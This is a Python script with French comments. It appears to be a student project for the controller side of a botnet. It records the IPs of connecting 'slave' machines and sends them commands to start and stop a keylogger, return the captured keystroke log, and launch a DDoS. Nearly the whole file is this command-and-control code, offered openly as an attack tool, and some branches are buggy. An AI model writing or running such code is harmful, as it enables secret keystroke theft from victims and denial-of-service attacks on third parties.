#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
import socket as modSocket
import argparse
import threading
import time
import argparse
import ast

lock = threading.Lock()

class Connexion():
    # création de l'objet connexion avec le champ adresseMachine.
    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, listeIP, port, fichier, chemin):
        self.adresseMachine = adresseMachine
        self.carteReseauEcoute = carteReseauEcoute
        self.carteReseauConn = carteReseauConn
        self.listeIP = listeIP
        self.port = port
        self.fichier = fichier
        self.chemin = chemin

    #1er étape, mettre en place un canal de communication pour recevoir les messages du slave
    def listen(self, carteReseauEcoute, port, fichier):
        # écoute sur toutes les adresses disponibles sur la machine et sur le port 60 000
        carteReseauEcoute.bind(("", port))
        # une fois connecté, on le met en écoute afin qu'il reçoive l'IP du slave; l'IP sera contenue dans addr
        carteReseauEcoute.listen()
        print("Attente de connexion")
        connReseau, addr = carteReseauEcoute.accept()
        print(connReseau)
        listeIP.append(addr[0])
        print ("L'IP du slave est : ", listeIP[0])
        fichier.write(str(listeIP))
        time.sleep(2)
        carteReseauEcoute.close()
        return listeIP
    

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au slave
    def receive(self, carteReseauConn ,listeIP):
        # on définit les coordonnées sur lesquelles le master va envoyer ses instructions
        try:
            print(listeIP)#est ce vraiment utile ?
            #si la liste n'est pas vide
            if len(listeIP) != 0:
                for adresse in listeIP:
                    carteReseauConn.connect((adresse, 60000))
                    print("Connection établie avec l'esclave")
                    
            else:
                print("On ne connait pas de machine esclave")
        #except: va print "erreur" si il n'y a pas eu de connexion
        except ConnectionRefusedError:
            print("Erreur de connexion")


"""
création de l'objet ChoixAction
avec le champ adresseMachine et s.
adresseMachine, va contenire l'adresse et le port sur lequel on va essayer de se connecter.
(petit défi pour toi. Si tu veux, essaye de faire en sorte que adresseMachine soit une liste avec plusieurs IP(differents esclaves)
et fais une boucle qui va permettre de se connecter a tous ces clients. )
s va contenire les infos sur le type de communication ect ...
Création de pusieurs methodes afin de choisir l'action a faire
sur le slave.
Ils vont tous avoir la même action a faire c'est à dire envoyer un message au client
pour activer une action.
"""

class ChoixAction(Connexion):

    def start_log(self, carteReseauConn):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie keylogger au client 
        carteReseauConn.send("keylogger".encode("utf-8"))
        #reçois directement sa réponse

    def ddos(self, carteReseauConn):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        carteReseauConn.send("ddos".encode("utf-8"))
    
    def stop_log(self, carteReseauConn):
        #idem
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        carteReseauConn.send("stop".encode("utf-8"))
        carteReseauConn.send("FIN".encode("utf-8"))

        print(carteReseauConn.recv(1024).decode("utf-8"))
    
    def get_log(self, carteReseauConn, chemin):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        carteReseauConn.send("transfert".encode("utf-8"))
        fichier = open(chemin, "wb")
        l = carteReseauConn.recv(1024)
        fichier.write(l)
        carteReseauConn.send("FIN".encode("utf-8"))


    def fin(self, carteReseauConn):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        carteReseauConn.send("FIN".encode("utf-8"))
        print(carteReseauConn.recv(1024).decode("utf-8"))
        
    
#on initie s et adresseMachine
fichier = open("ListeIP.txt", "r+")
listeIP = []
chemin = ""
port = ""
adresseMachine = ("localhost", 5000)
carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
objetChoixAction = ChoixAction(adresseMachine, carteReseauConn, carteReseauEcoute, listeIP, port, fichier, chemin)

parser = argparse.ArgumentParser()
parser.add_argument("--listen", type=int,
                     help="Ecoute sur un port donné et liste les IP connectées, pour le lancer il faut mettre le n° du port")
parser.add_argument("--key", type=str,
                     help="Lance le keylogger, ont pourra l'arrêter par après, pour le lancer suffit de mettre start à la fin")
parser.add_argument("--upload", type=str,
                     help="upload le fichier du keylogger, il faut entrez le chemin du fichier" )
parser.add_argument("--ddos", type=str,
                     help="envoie des paquets ipv4 sur une adresse donné, pour le lancer suffit de mettre la date et l'heure en format yyyy-mm-jj hh:mm")

args = parser.parse_args()

if args.listen:
    port = args.listen
    print(port)
    objetChoixAction.listen(carteReseauEcoute, port, fichier)
    select = input("Voulez vous toujour écouter (yes or no)?")
    if select == "yes":
        while select != "yes":
            carteReseauEcoute.close()
            carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
            objetChoixAction.listen(carteReseauEcoute, port, fichier)
            select = select = input("Voulez vous toujour écouter (yes or no)?")
    else:
        print("Fini d'écouter")

if args.key == "start":
    liste = fichier.read()
    if len(liste) != 0:
        print(liste)
        listeIP = ast.literal_eval(liste)
        objetChoixAction.receive(carteReseauConn ,listeIP)
        objetChoixAction.start_log(carteReseauConn)
        select = input("Voulez vous arreter le keylogger (o)? ")
        if select == "o":
            objetChoixAction.stop_log(carteReseauConn)
        carteReseauConn.close()
    else:
        print("Impossible de se connecter il n'y a pas d'IP dans la base de donnée")

if args.upload:
    chemin = args.upload
    print(chemin)
    liste = fichier.read()
    if len(liste) != 0:
        print(liste)
        listeIP = ast.literal_eval(liste)
        objetChoixAction.receive(carteReseauConn ,listeIP)
        objetChoixAction.get_log(carteReseauConn, chemin)
    else:
        print("Impossible de se connecter il n'y a pas d'IP dans la base de donnée")

if args.ddos:
    dateHeure = args.ddos
    print(dateHeure)
    liste = fichier.read()
    if len(liste) != 0:
        print(liste)
        listeIP = ast.literal_eval(liste)
        objetChoixAction.receive(carteReseauConn ,listeIP)
        objetChoixAction.get_log(carteReseauConn, chemin)
    else:
        print("Impossible de se connecter il n'y a pas d'IP dans la base de donnée")







"""
Pour rendre le code plus cool ont pourrait rajouter des arguments grace
au module argparse, on essaiera de mettre ça en place pour afficher par exemple les adresse avec
lesquels il sera connecter ect .......
À voir ce n'est pas urgent
"""

